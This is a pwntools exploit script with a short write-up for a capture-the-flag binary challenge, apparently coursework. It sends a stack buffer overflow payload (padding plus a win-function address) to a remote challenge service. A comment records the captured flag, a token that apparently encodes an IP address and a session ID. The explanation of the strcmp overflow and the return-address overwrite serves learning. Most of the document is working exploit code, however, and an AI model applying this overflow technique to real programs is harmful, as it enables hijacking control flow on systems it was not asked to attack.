from pwn import *

#flag is FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoibWlkc2VtLW1pZHNlbTIiLCJpcCI6IjIyMC4yNDAuNjYuMTUzIiwic2Vzc2lvbiI6IjM1NTk3ODhjLTUwZDItNGJmZC1iNmUyLWRlNmYyZjlmODMwYyJ9.2jP1X_AZ0Kk82pjldI1uQHB-mL5opl68U3KvE0uacAo}

p = remote('plsdonthaq.me', 24103)
#p = process('./ezpz')

p.recvuntil('(or press enter to refresh): ')

p.sendline('U')

p.recvuntil('Chuck us some bytes (max 255): ')

payload = b'A'*(0x7f + 0x4) + p32(0x08049273)

p.sendline(payload)

p.recvuntil('(or press enter to refresh): ')

p.sendline('O')

p.interactive()



'''
General overview of problems faced
-------------------------------------
EXPLOIT WORKS ON LOCAL BUT NOT REMOTE

underflow function will write some bytes into a buffer, which is then copied in overflow into another buffer.
strcmp is used instead of strncmp so we can copy more bytes into the buffer and overwrite the return address.

this buffer in overflow() is at ebp-0x7f, and return address is at ebp+0x4
so we should be able to write 0x83 bytes of garbage then the address of the win function 0x08049273, in the underflow code

then in overflow() it should jump to the win function since this is the new return address we set


Script/Command used
------------------
```
from pwn import *

p = remote('plsdonthaq.me', 24103)
#p = process('./ezpz_')

p.recvuntil('(or press enter to refresh): ')

p.sendline('U')

p.recvuntil('Chuck us some bytes (max 255): ')

payload = b'A'*(0x7f + 0x4) + p32(0x08049273)

p.sendline(payload)

p.recvuntil('(or press enter to refresh): ')

p.sendline('O')

p.interactive()
```
'''